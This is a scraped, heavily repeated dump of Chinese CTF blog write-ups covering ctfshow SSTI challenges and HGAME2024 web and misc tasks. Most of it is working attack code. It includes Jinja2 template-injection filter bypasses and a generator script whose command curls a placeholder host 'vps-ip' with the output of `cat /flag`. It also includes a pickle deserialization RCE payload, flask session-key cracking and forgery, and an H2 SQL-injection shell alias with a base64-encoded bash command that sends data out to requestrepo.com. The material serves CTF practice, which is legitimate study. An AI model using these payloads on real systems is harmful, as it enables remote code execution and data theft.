a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1全角数字绕过"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2构造数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload3index构造数字"},{"categories":["CTF","web"],"content":"\r[web370]过滤’’、\"\"、[、args、_、os、{{、request、数字以web369的payload进行修改： ?name= {% set po=dict(po=1,p=2)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload1：全角数字绕过 '０','１','２','３','４','５','６','７','８','９' 用全角数字替换payload中的半角数字 ?name= {% set po=dict(po=１,p=２)|join%} {% set a=(()|select|string|list)|attr(po)(２４)%} {% set re=dict(reque=１,st=１)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(４７)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload2：构造数字 {% set cc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|length)%} 从而cc=2,cccc=4 再{% set coun=(cc~cccc)|int%} --\u003e coun=24 快速得到一个数值 所以，构造 {% set ershisi=(cc~cccc)|int%} {% set po=dict(po=c,p=c)|join%} {% set a=(()|select|string|list)|attr(po)(ershisi)%} 等效于： {% set a=(()|select|string|list)|pop(24)%} payload： ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set twoandfour=(cc~cccc)|int%} {% set fourandseven=(cccc~ccccccc)|int%} {% set po=dict(po=b,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(twoandfour)%} {% set re=dict(reque=b,st=b)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(fourandseven)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} payload3：index构造数字 ?name= {% set o=(dict(o=z)|join) %} {% set n=dict(n=z)|join %} {% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %} {% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %} {% set xiegang=(config|string|list).pop(-liushisi) %} {% set gang=(()|select|string|list).pop(ershisi) %} {% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %} {% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %} {% set gangfulaige=(xiegang,dict(flag=z)|join)|join %} {% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %} payload4：反弹shell import requests cmd='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def fun1(s): t=[] for i in range(len(s)): t.append(ord(s[i])) k='' t=list(set(t)) for i in t: k+='{% set '+'e'*(t.index(i)+1)+'=dict('+'e'*i+'=a)|join|count%}\\n' return k def fun2(s): t=[] for i in range(len(s)): t.append(ord(s[i])) t=list(set(t)) k='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload4反弹shell"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print\rpayload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {%if x.eval(cmd)%} abc {%endif%} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i\u003clen(s)-1: t+='chr('+aaa(str(ord(s[i])))+')%2b' else: t+='chr('+aaa(str(ord(s[i])))+')' return t print(ccchr(s)) ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web371过滤args_osrequest数字print"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print\rpayload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {%if x.eval(cmd)%} abc {%endif%} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1web370反弹shell"},{"categories":["CTF","web"],"content":"\r[web371]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print\rpayload1：web370反弹shell\rpayload2：payload固定，里面的一部分cmd用脚本生成payload： ?name= {% set c=(t|count)%} {% set cc=(dict(e=a)|join|count)%} {% set ccc=(dict(ee=a)|join|count)%} {% set cccc=(dict(eee=a)|join|count)%} {% set ccccc=(dict(eeee=a)|join|count)%} {% set cccccc=(dict(eeeee=a)|join|count)%} {% set ccccccc=(dict(eeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%} {% set coun=(ccc~ccccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set cmd=【xxx】 %} {%if x.eval(cmd)%} abc {%endif%} 生成cmd的脚本： def aaa(t): t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int' return t s='__import__(\"os\").popen(\"curl http://vps-ip:9023?p=`cat /flag`\").read()' def ccchr(s): t='' for i in range(len(s)): if i","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2payload固定里面的一部分cmd用脚本生成"},{"categories":["CTF","web"],"content":"\r[web372]过滤’’、\"\"、[、args、_、os、{{、request、数字、{%print、count利用上题的payload2，count换成length 参考： https://blog.csdn.net/Jayjay___/article/details/132210050 https://www.freebuf.com/articles/web/325473.html ","date":"2024-03-10","objectID":"/ctfshow_ssti/:2:12","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web372过滤args_osrequest数字printcount"},{"categories":["CTF","wp"],"content":"HGAME2024_week2_web\u0026misc ","date":"2024-02-14","objectID":"/hgame2024_week2/:0:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#"},{"categories":["CTF","wp"],"content":"\rWeek2","date":"2024-02-14","objectID":"/hgame2024_week2/:0:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#week2"},{"categories":["CTF","wp"],"content":"\rweb","date":"2024-02-14","objectID":"/hgame2024_week2/:1:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#web"},{"categories":["CTF","wp"],"content":"\r[What the cow say?]除了反引号，$()也可以 `ls /` 直接用cat命令会被waf拦截 `tac /fla*/fla*` ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:1","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#what-the-cow-say"},{"categories":["CTF","wp"],"content":"\r[Select More Courses]登陆界面，使用top1000字典进行爆破 根据提示，应该是时间竞争 POST /api/expand HTTP/1.1 Host: 139.196.183.57:30232 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://139.196.183.57:30232/expand Content-Type: application/json Content-Length: 23 Origin: http://139.196.183.57:30232 Connection: close Cookie: session=MTcwODA2NzE4MXxEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fIP0P43CugxLBJt9xdo6NEpISwrwf3-CXDctl9thdqyW {\"username\":\"ma5hr00m\"} payload类型选null并无限重复发包 再返回自主选课查看 ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:2","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#select-more-courses"},{"categories":["CTF","wp"],"content":"\r[myflask] import pickle import base64 from flask import Flask, session, request, send_file from datetime import datetime from pytz import timezone currentDateAndTime = datetime.now(timezone('Asia/Shanghai')) currentTime = currentDateAndTime.strftime(\"%H%M%S\") app = Flask(__name__) # Tips: Try to crack this first ↓ app.config['SECRET_KEY'] = currentTime print(currentTime) @app.route('/') def index(): session['username'] = 'guest' return send_file('app.py') @app.route('/flag', methods=['GET', 'POST']) def flag(): if not session: return 'There is no session available in your client :(' if request.method == 'GET': return 'You are {} now'.format(session['username']) # For POST requests from admin if session['username'] == 'admin': pickle_data=base64.b64decode(request.form.get('pickle_data')) # Tips: Here try to trigger RCE userdata=pickle.loads(pickle_data) return userdata else: return 'Access Denied' if __name__=='__main__': app.run(debug=True, host=\"0.0.0.0\") [flask中session的那些事](flask中session的那些事 (ctf.org.cn)) pickle—— Python 物件序列化 flask-session伪造 访问/flag 由以下代码可知，SECRET_KEY为6位数字 currentDateAndTime = datetime.now(timezone('Asia/Shanghai')) currentTime = currentDateAndTime.strftime(\"%H%M%S\") app = Flask(__name__) # Tips: Try to crack this first ↓ app.config['SECRET_KEY'] = currentTime 使用crunch生成6位数字字典 crunch 6 6 0123456789 -o ~/000000-999999.txt 爆破SECRET_KEY flask-unsign --unsign --cookie \"eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc8itA.-x96nzpnRAmc-tQCxN5uxYLhlQA\" --no-literal-eval --wordlist 000000-999999.txt 得到SECRET_KEY为165350并进行session伪造 flask-unsign --sign --cookie \"{'username': 'admin'}\" --secret 165350 --no-literal-eval 将cookie写入浏览器，访问/flag接口进行验证 pickle反序列化rce @app.route('/flag', methods=['GET', 'POST']) def flag(): ... ... # For POST requests from admin if session['username'] == 'admin': pickle_data=base64.b64decode(request.form.get('pickle_data')) # Tips: Here try to trigger RCE userdata=pickle.loads(pickle_data) return userdata ... 用POST方法请求/flag接口，程序使用pickle.dumps方法反序列化提交的pickle_data参数，并返回反序列化结果 构造__reduce__方法进行rce import pickle import base64 from urllib.parse import urlencode class myflaskrce: def __reduce__(self): return (open, ('/flag', 'r')) payload = base64.b64encode(pickle.dumps(myflaskrce())) post_params = {'pickle_data': payload} print(urlencode(post_params)) 执行脚本，得到payload pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D 随后发包 POST /flag HTTP/1.1 Host: 139.196.183.57:32139 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Zc8ulQ.hoc3E0E5-vcmVRCr9gVve05SKG4 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:3","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#myflask"},{"categories":["CTF","wp"],"content":"\r[search4member]sql注入–堆叠注入实现rce 尝试a' or 1=1 --+，得到表中所有数据 回显有三个字段。查询库名： a' union select 1,2,database() --+ Spring Boot Actuator H2 RCE漏洞复现 a'; CREATE ALIAS SHELL AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}';' rce，通过dnslog外带 https://requestrepo.com/ a';CALL SHELL('bash -c {echo,Y3VybCBgY2F0IC9mbGFnYC5kN3VobWE4ai5yZXF1ZXN0cmVwby5jb20=}|{base64,-d}|{bash,-i}');' ","date":"2024-02-14","objectID":"/hgame2024_week2/:1:4","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#search4member"},{"categories":["CTF","wp"],"content":"\rmisc","date":"2024-02-14","objectID":"/hgame2024_week2/:2:0","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#misc"},{"categories":["CTF","wp"],"content":"\r[ek1ng_want_girlfriend]\rhgame{ek1ng_want_girlfriend_qq_761042182} ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:1","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#ek1ng_want_girlfriend"},{"categories":["CTF","wp"],"content":"\r[ezWord]将docx文件后缀改为zip并解压 在\\attachment\\这是一个word文件\\word\\media文件发现提示 根据恭喜.txt推测为双图隐写 得到解压密码 T1hi3sI4sKey 解压后得到secret.txt文本 根据文本特征推测为垃圾邮件编码 https://www.spammimic.com/decode.shtml 得到文本 籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆 ROT-8000解码 Chiffre ROT8000 - Déchiffrer, Decoder, Encoder en Ligne (dcode.fr) ","date":"2024-02-14","objectID":"/hgame2024_week2/:2:2","series":null,"tags":["CTF","wp"],"title":"HGAME2024_week2_wp","uri":"/hgame2024_week2/#ezword"},{"categories":["CTF","wp"],"content":"\r[龙之舞]音频的频谱分析，发现可疑信息 进行反转和镜像 KEY:5H8w1nlWCX3hQLG 